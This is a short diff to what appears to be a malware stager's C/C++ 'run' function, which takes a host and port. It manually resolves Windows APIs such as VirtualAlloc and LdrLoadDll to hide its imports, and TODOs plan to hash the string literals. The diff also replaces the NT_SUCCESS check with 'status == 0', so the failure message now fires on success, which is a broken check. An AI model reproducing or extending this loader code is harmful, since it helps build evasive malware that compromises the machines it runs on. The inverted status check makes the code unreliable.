@@ -34,7 +34,19 @@
 //bool Stager::run(const std::string& host, const std::string& port)
 int run(const char* host, const char* port)
 {
-    // 1. manually resolve apis (skip for now and just include the headers that import it)
+    // 1. manually resolve apis
+
+    /*
+    TODO: 
+    would i be more effient to find the function/procedure names all at once for a single dll/module so i don't have 
+    to loop through the array of functions every single time?
+
+    something like this:
+    resolve_all_functions(dll_base, hashes, pointers, count);
+
+    not sure if this is worth doing for dlls/modules tho
+    
+    */
 
 	// TODO: hash these string literals 
     FuncVirtualAlloc pVirtualAlloc = (FuncVirtualAlloc)GetProcAddressManual("kernel32.dll", "VirtualAlloc");
@@ -52,8 +64,10 @@ int run(const char* host, const char* port)
     PVOID dllBase; // ws2_32.dll pModule
     NTSTATUS status = pLdrLoadDll(NULL, NULL, &usDllName, &dllBase);
     // TODO: for now we just assume it's always successful
-    if (!NT_SUCCESS(status))
+    //if (!NT_SUCCESS(status))
+    if (status == 0)
 	{
+        printf("status = %d\n", status);
 		printf("pLdrLoadDll was unable to obtain valid dllBase\n");
 	}
 
